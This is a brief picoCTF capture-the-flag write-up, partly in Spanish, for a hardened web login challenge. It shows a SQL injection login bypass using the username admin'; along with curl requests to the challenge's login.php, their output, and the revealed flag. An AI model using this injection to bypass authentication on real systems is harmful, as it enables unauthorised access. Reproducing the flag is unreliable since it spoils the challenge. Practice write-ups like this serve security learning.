## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
## Solución 
```
username: admin';
password: hola
picoCTF{m0R3_SQL_plz_c34df170}
se inyecto el admin

En consola
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin&password=admindebug=1"
<h1>Login failed.</h1>                                                                             
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=admindebug=1"
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>                                                                             
┌──(kali㉿kali)-[~]

```

## Notas adicionales
Por medio de la injection sql podemos modificar el usuario, porque en este reto solo nos validaba la contraseña pero no el usuario.
## Referencias
